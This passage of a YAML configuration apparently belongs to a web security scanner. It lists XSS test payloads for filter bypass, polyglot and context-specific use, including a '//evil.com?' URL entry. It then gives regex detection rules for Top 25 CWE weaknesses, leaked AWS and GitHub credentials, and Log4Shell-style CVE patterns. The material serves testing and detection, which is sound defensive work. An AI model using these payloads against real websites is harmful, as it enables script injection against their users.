    - '<object id=x><param name=y value=z>'
    - '<output id=x>test</output>'
    - '<iframe name=x srcdoc="<a id=y href=z>">'
    - '<form id=document><input name=cookie>'

  # Filter bypass payloads
  filter_bypass:
    - '<svg/onload=alert(1)>'
    - '<svg onload=alert(1)//>'
    - '<svg onload="alert(1)">'
    - "<svg onload='alert(1)'>"
    - '<img src=x onerror="alert(1)">'
    - '<img src=x onerror=alert`1`>'
    - '<img src=x onerror=alert&#40;1&#41;>'
    - '<script>alert(1)</script//>'
    - '<script>alert(1);</script >'
    - '<script >alert(1)</script>'
    - '< script>alert(1)</script>'
    - '<SCRIPT>alert(1)</SCRIPT>'
    - '<ScRiPt>alert(1)</ScRiPt>'
    - '<script\x20>alert(1)</script>'
    - '<script\x09>alert(1)</script>'
    - '<script\x0a>alert(1)</script>'
    - '<script\x0d>alert(1)</script>'
    - '<script\x00>alert(1)</script>'
    - '<script/x>alert(1)</script>'
    - '<img src="x`onerror=alert(1)">'
    - '<img src=`x`onerror=alert(1)>'
    - "<<script>alert(1);//<</script>"
    - '<x onclick=alert(1)>click'
    - '<x style=behavior:url(#default#time2) onbegin=alert(1)>'
    - '<x contenteditable onblur=alert(1)>lose focus!'
    - '<marquee loop=1 onfinish=alert(1)>xss'
    - '<marquee onstart=alert(1)>'
    - '<body/onload=alert(1)>'
    - '<body\x09onload=alert(1)>'
    - '<body\x0aonload=alert(1)>'
    - '</script><script>alert(1)</script>'
    - '</title><script>alert(1)</script>'
    - '</style><script>alert(1)</script>'
    - '</textarea><script>alert(1)</script>'
    - '</noscript><script>alert(1)</script>'
    - "';alert(1)//\\"
    - '";alert(1)//\\'
    - "\\';alert(1);//"

  # Polyglot payloads (work in multiple contexts)
  polyglot:
    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
    - "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><svg/onload=alert()>"
    - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
    - "-->'\"--></style></script><script>alert(1)</script>"
    - "'\"><img src=x onerror=alert(1)//>"
    - "'-alert(1)-'"
    - "\\'-alert(1)//"

  # Context-specific payloads
  html_context:
    - '<script>alert(1)</script>'
    - '<img src=x onerror=alert(1)>'
    - '<svg onload=alert(1)>'

  attribute_context:
    - '" onmouseover="alert(1)"'
    - "' onmouseover='alert(1)'"
    - '" onfocus="alert(1)" autofocus "'
    - "' onfocus='alert(1)' autofocus '"

  javascript_context:
    - "'-alert(1)-'"
    - '"-alert(1)-"'
    - "\\'-alert(1)//"
    - "\\'-alert(1)-\\'"
    - '</script><script>alert(1)</script>'
    - "1;alert(1)//"
    - "1}alert(1)//"
    - "1)]};alert(1)//"

  url_context:
    - 'javascript:alert(1)'
    - 'data:text/html,<script>alert(1)</script>'
    - '//evil.com?'

  css_context:
    - 'expression(alert(1))'
    - 'url(javascript:alert(1))'
    - "};alert(1)//'"

# ============================================================================
# TOP 25 CWE DETECTION PATTERNS
# ============================================================================
# Detection patterns for the top 25 most dangerous software weaknesses
# Reference: https://cwe.mitre.org/top25/archive/2024/2024_top25_list.html
# ============================================================================

cwe_patterns:
  # ---------------------------------------------------------------------------
  # CWE-79: Cross-site Scripting (XSS) - Covered above in sinks section
  # ---------------------------------------------------------------------------

  # ---------------------------------------------------------------------------
  # CWE-89: SQL Injection
  # ---------------------------------------------------------------------------
  sql_injection:
    - name: "SQL query construction"
      pattern: '(?:query|sql|execute|prepare)\s*\(\s*[`''"]\s*(?:SELECT|INSERT|UPDATE|DELETE|DROP|UNION|FROM|WHERE)'
      description: "Direct SQL query construction"
      severity: "CRITICAL"
      cwe: "CWE-89"

    - name: "String concat in query"
      pattern: '(?:query|sql)\s*[\+\+=].*[\+\+]\s*(?:req|request|params|input|user)'
      description: "String concatenation in SQL query"
      severity: "CRITICAL"
      cwe: "CWE-89"

    - name: "Template literal SQL"
      pattern: '(?:query|sql|execute)\s*\(\s*`[^`]*\$\{.*\}'
      description: "Template literal in SQL"
      severity: "CRITICAL"
      cwe: "CWE-89"

  # ---------------------------------------------------------------------------
  # CWE-78: OS Command Injection
  # ---------------------------------------------------------------------------
  command_injection:
    - name: "exec function"
      pattern: '\bexec\s*\(\s*[^)]*(?:req|request|params|input|user)'
      description: "exec() with user input"
      severity: "CRITICAL"
      cwe: "CWE-78"

    - name: "child_process spawn"
      pattern: '(?:spawn|execFile|execSync|spawnSync)\s*\('
      description: "Child process execution"
      severity: "HIGH"
      cwe: "CWE-78"

    - name: "shell execution"
      pattern: 'shell\s*:\s*true'
      description: "Shell execution enabled"
      severity: "HIGH"
      cwe: "CWE-78"

    - name: "system call"
      pattern: '\bsystem\s*\(\s*[^)]*(?:\+|`|\$)'
      description: "System call with dynamic input"
      severity: "CRITICAL"
      cwe: "CWE-78"

  # ---------------------------------------------------------------------------
  # CWE-22: Path Traversal
  # ---------------------------------------------------------------------------
  path_traversal:
    - name: "Path join with user input"
      pattern: '(?:path\.join|path\.resolve)\s*\([^)]*(?:req|request|params|input)'
      description: "Path construction with user input"
      severity: "HIGH"
      cwe: "CWE-22"

    - name: "fs operations with input"
      pattern: '(?:readFile|writeFile|readdir|unlink|rmdir)\s*\([^)]*(?:req|request|params|input)'
      description: "File system operation with user input"
      severity: "HIGH"
      cwe: "CWE-22"

    - name: "Directory traversal pattern"
      pattern: '(?:\.\./|\.\.\\\\|%2e%2e|%252e)'
      description: "Directory traversal sequence"
      severity: "HIGH"
      cwe: "CWE-22"

    - name: "file:// protocol"
      pattern: 'file://'
      description: "File protocol handler"
      severity: "MEDIUM"
      cwe: "CWE-22"

  # ---------------------------------------------------------------------------
  # CWE-352: Cross-Site Request Forgery (CSRF)
  # ---------------------------------------------------------------------------
  csrf:
    - name: "Form without CSRF token"
      pattern: '<form[^>]*method\s*=\s*["\']?post[^>]*>(?:(?!csrf|token|_token|authenticity).)*?</form>'
      description: "POST form without CSRF token"
      severity: "MEDIUM"
      cwe: "CWE-352"

    - name: "State-changing GET"
      pattern: '<a[^>]*href\s*=\s*["\'][^"\']*(?:delete|remove|update|create|modify)'
      description: "State-changing action via GET"
      severity: "MEDIUM"
      cwe: "CWE-352"

    - name: "Missing SameSite cookie"
      pattern: 'Set-Cookie:[^;]*(?:session|auth|token)(?!.*SameSite)'
      description: "Session cookie without SameSite"
      severity: "LOW"
      cwe: "CWE-352"

  # ---------------------------------------------------------------------------
  # CWE-918: Server-Side Request Forgery (SSRF)
  # ---------------------------------------------------------------------------
  ssrf:
    - name: "URL from user input"
      pattern: '(?:fetch|axios|request|http\.get|https\.get)\s*\([^)]*(?:req|request|params|url|target|host)'
      description: "HTTP request with user-controlled URL"
      severity: "HIGH"
      cwe: "CWE-918"

    - name: "URL constructor"
      pattern: 'new\s+URL\s*\([^)]*(?:req|request|params|input|user)'
      description: "URL construction with user input"
      severity: "HIGH"
      cwe: "CWE-918"

    - name: "Internal IP patterns"
      pattern: '(?:127\.0\.0\.1|localhost|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|169\.254\.\d+\.\d+|0\.0\.0\.0)'
      description: "Internal/private IP address"
      severity: "INFO"
      cwe: "CWE-918"

  # ---------------------------------------------------------------------------
  # CWE-502: Deserialization of Untrusted Data
  # ---------------------------------------------------------------------------
  deserialization:
    - name: "JSON.parse without validation"
      pattern: 'JSON\.parse\s*\([^)]*(?:req|request|body|params|input)'
      description: "JSON parsing of user input"
      severity: "MEDIUM"
      cwe: "CWE-502"

    - name: "unserialize/pickle"
      pattern: '(?:unserialize|pickle\.loads|yaml\.load)\s*\('
      description: "Dangerous deserialization function"
      severity: "CRITICAL"
      cwe: "CWE-502"

    - name: "Object.assign prototype"
      pattern: 'Object\.assign\s*\(\s*(?:{}|Object\.create)'
      description: "Potential prototype pollution"
      severity: "MEDIUM"
      cwe: "CWE-502"

    - name: "YAML unsafe load"
      pattern: 'yaml\.(?:unsafe_load|load)\s*\('
      description: "Unsafe YAML loading"
      severity: "CRITICAL"
      cwe: "CWE-502"

  # ---------------------------------------------------------------------------
  # CWE-287: Improper Authentication
  # ---------------------------------------------------------------------------
  auth_bypass:
    - name: "Hardcoded credentials"
      pattern: '(?:password|passwd|pwd|secret|api_key|apikey|token)\s*[:=]\s*["\'][^"\']{4,}["\']'
      description: "Hardcoded credential or secret"
      severity: "HIGH"
      cwe: "CWE-287"

    - name: "Weak password comparison"
      pattern: '(?:password|passwd)\s*(?:==|===|!=|!==)\s*["\']'
      description: "Direct password comparison"
      severity: "MEDIUM"
      cwe: "CWE-287"

    - name: "Authentication bypass"
      pattern: '(?:isAdmin|isAuthenticated|isLoggedIn)\s*[:=]\s*(?:true|1|["\'])'
      description: "Hardcoded authentication flag"
      severity: "CRITICAL"
      cwe: "CWE-287"

  # ---------------------------------------------------------------------------
  # CWE-94: Code Injection
  # ---------------------------------------------------------------------------
  code_injection:
    - name: "eval with user input"
      pattern: '\beval\s*\([^)]*(?:req|request|params|input|user|body)'
      description: "eval() with user input"
      severity: "CRITICAL"
      cwe: "CWE-94"

    - name: "new Function"
      pattern: 'new\s+Function\s*\([^)]*(?:req|request|params|input|user)'
      description: "Function constructor with user input"
      severity: "CRITICAL"
      cwe: "CWE-94"

    - name: "vm.runInContext"
      pattern: 'vm\.(?:runIn|compile|createContext)'
      description: "Node.js VM execution"
      severity: "HIGH"
      cwe: "CWE-94"

  # ---------------------------------------------------------------------------
  # CWE-862: Missing Authorization
  # ---------------------------------------------------------------------------
  missing_auth:
    - name: "Unprotected route"
      pattern: 'app\.(?:get|post|put|delete|patch)\s*\([^)]*(?:admin|user|private|internal)[^)]*,\s*(?:function|async|\()'
      description: "Potentially unprotected sensitive route"
      severity: "MEDIUM"
      cwe: "CWE-862"

    - name: "Direct object reference"
      pattern: '(?:findById|findOne|getById)\s*\([^)]*(?:req\.params|req\.query|req\.body)'
      description: "Direct object reference from user input"
      severity: "MEDIUM"
      cwe: "CWE-862"

  # ---------------------------------------------------------------------------
  # CWE-434: Unrestricted File Upload
  # ---------------------------------------------------------------------------
  file_upload:
    - name: "File extension validation"
      pattern: '(?:\.jpg|\.png|\.gif|\.pdf)(?:\s*\|\||\s*,)'
      description: "Client-side file extension check"
      severity: "LOW"
      cwe: "CWE-434"

    - name: "MIME type check bypass"
      pattern: 'mimetype|content-type.*(?:image|application)'
      description: "MIME type validation (may be bypassable)"
      severity: "INFO"
      cwe: "CWE-434"

    - name: "File upload without validation"
      pattern: '(?:multer|formidable|busboy)\s*\(['
      description: "File upload middleware"
      severity: "INFO"
      cwe: "CWE-434"

  # ---------------------------------------------------------------------------
  # CWE-798: Hardcoded Credentials
  # ---------------------------------------------------------------------------
  hardcoded_creds:
    - name: "AWS credentials"
      pattern: 'AKIA[0-9A-Z]{16}'
      description: "AWS Access Key ID"
      severity: "CRITICAL"
      cwe: "CWE-798"

    - name: "Private key"
      pattern: '-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----'
      description: "Private key in code"
      severity: "CRITICAL"
      cwe: "CWE-798"

    - name: "GitHub token"
      pattern: 'gh[pousr]_[A-Za-z0-9_]{36,}'
      description: "GitHub personal access token"
      severity: "CRITICAL"
      cwe: "CWE-798"

    - name: "JWT secret"
      pattern: 'jwt\.sign\s*\([^)]*["\'][^"\']{8,}["\']'
      description: "Hardcoded JWT secret"
      severity: "HIGH"
      cwe: "CWE-798"

  # ---------------------------------------------------------------------------
  # CWE-200: Information Exposure
  # ---------------------------------------------------------------------------
  info_exposure:
    - name: "Stack trace exposure"
      pattern: '(?:console\.(?:log|error)|print)\s*\([^)]*(?:err|error|exception|stack)'
      description: "Error/stack trace logging"
      severity: "LOW"
      cwe: "CWE-200"

    - name: "Debug mode enabled"
      pattern: '(?:debug|DEBUG)\s*[:=]\s*(?:true|1|["\'])'
      description: "Debug mode enabled"
      severity: "LOW"
      cwe: "CWE-200"

    - name: "Verbose error messages"
      pattern: 'res\.(?:send|json)\s*\([^)]*(?:error|err|exception|message)'
      description: "Error details in response"
      severity: "LOW"
      cwe: "CWE-200"

  # ---------------------------------------------------------------------------
  # CWE-306: Missing Authentication for Critical Function
  # ---------------------------------------------------------------------------
  missing_auth_critical:
    - name: "Unprotected API endpoint"
      pattern: 'app\.(?:post|put|delete)\s*\(["\'][^"\']*(?:admin|user|account|password|payment|transfer)'
      description: "Critical endpoint may lack authentication"
      severity: "HIGH"
      cwe: "CWE-306"

  # ---------------------------------------------------------------------------
  # CWE-269: Improper Privilege Management
  # ---------------------------------------------------------------------------
  privilege_escalation:
    - name: "Role assignment"
      pattern: '(?:role|admin|privilege)\s*[:=]\s*(?:req|request|params|input|user)'
      description: "Role/privilege from user input"
      severity: "HIGH"
      cwe: "CWE-269"

    - name: "Admin flag"
      pattern: 'isAdmin\s*[:=]\s*(?:req|request|params|body)'
      description: "Admin flag from user input"
      severity: "CRITICAL"
      cwe: "CWE-269"

  # ---------------------------------------------------------------------------
  # CWE-400: Resource Exhaustion / DoS
  # ---------------------------------------------------------------------------
  resource_exhaustion:
    - name: "Regex DoS"
      pattern: 'new\s+RegExp\s*\([^)]*(?:\+|\*|\{)'
      description: "Dynamic regex construction"
      severity: "MEDIUM"
      cwe: "CWE-400"

    - name: "Unbounded loop"
      pattern: 'while\s*\(\s*true\s*\)'
      description: "Potentially infinite loop"
      severity: "MEDIUM"
      cwe: "CWE-400"

    - name: "Large allocation"
      pattern: 'new\s+Array\s*\(\s*(?:req|request|params|input)'
      description: "Array size from user input"
      severity: "MEDIUM"
      cwe: "CWE-400"

  # ---------------------------------------------------------------------------
  # CWE-601: URL Redirection to Untrusted Site
  # ---------------------------------------------------------------------------
  open_redirect:
    - name: "Redirect with user input"
      pattern: '(?:redirect|location\.href|window\.location)\s*[:=]\s*(?:req|request|params|url|next|return)'
      description: "Redirect with user-controlled URL"
      severity: "MEDIUM"
      cwe: "CWE-601"

    - name: "Header location"
      pattern: 'res\.(?:redirect|setHeader\s*\(["\']location)'
      description: "HTTP redirect"
      severity: "INFO"
      cwe: "CWE-601"

  # ---------------------------------------------------------------------------
  # CWE-611: XXE (XML External Entity)
  # ---------------------------------------------------------------------------
  xxe:
    - name: "XML parsing"
      pattern: '(?:parseXML|DOMParser|xml2js|fast-xml-parser)\s*\('
      description: "XML parsing (check for XXE protection)"
      severity: "MEDIUM"
      cwe: "CWE-611"

    - name: "DOCTYPE in XML"
      pattern: '<!DOCTYPE[^>]*SYSTEM|<!ENTITY'
      description: "External entity declaration"
      severity: "HIGH"
      cwe: "CWE-611"

  # ---------------------------------------------------------------------------
  # CWE-125/CWE-787: Buffer Issues (Out-of-bounds Read/Write)
  # ---------------------------------------------------------------------------
  buffer_issues:
    - name: "Buffer allocation"
      pattern: 'Buffer\.(?:alloc|from|allocUnsafe)\s*\([^)]*(?:req|request|params|input|size)'
      description: "Buffer with user-controlled size"
      severity: "MEDIUM"
      cwe: "CWE-787"

    - name: "Slice with user input"
      pattern: '\.(?:slice|substring|substr)\s*\([^)]*(?:req|request|params|input)'
      description: "String/array slice with user input"
      severity: "LOW"
      cwe: "CWE-125"

  # ---------------------------------------------------------------------------
  # CWE-863: Incorrect Authorization
  # ---------------------------------------------------------------------------
  incorrect_auth:
    - name: "Role check bypass"
      pattern: '(?:role|user\.type)\s*(?:==|===|!=|!==)\s*["\'](?:admin|user)["\']'
      description: "Simple role comparison"
      severity: "MEDIUM"
      cwe: "CWE-863"

    - name: "IDOR pattern"
      pattern: '(?:findById|getById|deleteById)\s*\((?:req\.params\.id|req\.query\.id)'
      description: "Direct object reference without authorization check"
      severity: "HIGH"
      cwe: "CWE-863"

# ============================================================================
# CVE REFERENCE PATTERNS
# ============================================================================
# Patterns for detecting known CVE-vulnerable code patterns
cve_patterns:
  - name: "Log4j JNDI"
    pattern: '\$\{(?:jndi|env|sys|java|lower|upper):'
    description: "Log4Shell (CVE-2021-44228) pattern"
    severity: "CRITICAL"
    cve: "CVE-2021-44228"

  - name: "Spring4Shell"
    pattern: 'class\.module\.classLoader'
    description: "Spring4Shell (CVE-2022-22965) pattern"
    severity: "CRITICAL"
    cve: "CVE-2022-22965"

  - name: "Lodash prototype pollution"
    pattern: '__proto__|constructor\[|prototype\['
    description: "Prototype pollution pattern"
    severity: "HIGH"
    cve: "CVE-2020-8203"

  - name: "jQuery XSS"
    pattern: '\$\s*\(\s*["\'][^"\']*<'
    description: "jQuery selector XSS (CVE-2020-11022)"
    severity: "MEDIUM"
    cve: "CVE-2020-11022"
